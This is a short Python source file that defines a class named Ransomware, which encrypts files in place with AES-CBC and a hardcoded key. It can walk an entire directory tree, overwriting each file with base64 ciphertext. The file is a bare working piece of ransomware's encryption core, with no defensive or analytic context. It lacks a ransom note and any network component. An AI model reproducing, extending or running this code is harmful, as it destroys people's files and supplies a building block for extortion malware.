import os
from Crypto.Cipher import AES
import base64

# Generate a key for encryption (ensure this key is securely managed)
key = b'Sixteen byte key'  # Make sure this key is 16 bytes long

class Ransomware:
    def __init__(self, key):
        self.key = key

    def pad(self, s):
        padding_length = AES.block_size - len(s) % AES.block_size
        padding = chr(padding_length) * padding_length
        return s + padding

    def encrypt_file(self, file_path):
        print(f"Attempting to encrypt {file_path}")
        if not os.path.exists(file_path):
            print(f"File not found: {file_path}")
            return
        
        try:
            # Read the file
            with open(file_path, 'rb') as file:
                raw = file.read()
            print(f"Original content of {file_path}: {raw}")

            # Pad the content
            raw_padded = self.pad(raw.decode('utf-8')).encode('utf-8')
            print(f"Padded content: {raw_padded}")

            # Create a cipher object and encrypt the data
            iv = os.urandom(AES.block_size)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            encrypted = base64.b64encode(iv + cipher.encrypt(raw_padded))

            # Write the encrypted content back to the file
            with open(file_path, 'wb') as file:
                file.write(encrypted)
            print(f"Encrypted content written to {file_path}: {encrypted}")

            # Verify the file has been changed
            with open(file_path, 'rb') as file:
                final_content = file.read()
            print(f"Final content of {file_path}: {final_content}")

        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")

    def encrypt_files_in_directory(self, directory):
        print(f"Starting encryption for directory: {directory}")
        if os.path.isfile(directory):
            self.encrypt_file(directory)
        else:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    self.encrypt_file(file_path)
        print("Encryption process completed.")

# Example usage
file_to_encrypt = 'SuperSecretFile.txt'  # Replace with the path to your file
ransomware = Ransomware(key)
ransomware.encrypt_files_in_directory(file_to_encrypt)
